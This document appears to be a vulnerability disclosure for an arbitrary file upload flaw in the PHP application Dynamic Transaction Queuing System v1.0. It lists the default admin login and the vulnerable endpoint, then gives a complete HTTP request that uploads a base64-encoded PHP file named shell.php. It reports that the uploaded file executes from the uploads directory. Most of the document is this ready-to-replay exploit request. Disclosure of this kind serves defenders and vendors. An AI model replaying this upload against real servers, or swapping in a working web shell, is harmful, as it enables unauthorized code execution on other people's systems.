# Dynamic Transaction Queuing System v1.0 by oretnom23 has arbitrary code execution (RCE)

BUG_Author: ctg503 team

vendors: https://www.sourcecodester.com/php/14479/dynamic-transaction-queuing-system-using-phpmysql-source-code.html

The program is built using the xmapp-php8.1 version

Login account: admin/admin123 (Super Admin account)

Vulnerability url: ip/queuing/admin/ajax.php?action=save_uploads

Loophole location: Dynamic Transaction Queuing System's "/queuing/admin/ajax.php?action=save_uploads" file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /queuing/admin/ajax.php?action=save_uploads HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/queuing/admin/index.php?page=uploads
Content-Length: 396
Content-Type: multipart/form-data; boundary=---------------------------208633099825036
Cookie: PHPSESSID=t4551shae3529036q2g0j8luub
Connection: close

-----------------------------208633099825036
Content-Disposition: form-data; name="id"


-----------------------------208633099825036
Content-Disposition: form-data; name="img[]"

data:image/php;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
-----------------------------208633099825036
Content-Disposition: form-data; name="imgName[]"

shell.php
-----------------------------208633099825036--
```

The files will be uploaded to this directory \queuing\admin\assets\uploads\
![image](https://user-images.githubusercontent.com/54017627/199705856-8043d6f4-9fdb-460b-952d-c4231a555b4e.png)


We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/199705939-55700407-abaf-4d99-998e-8d9625b89beb.png)

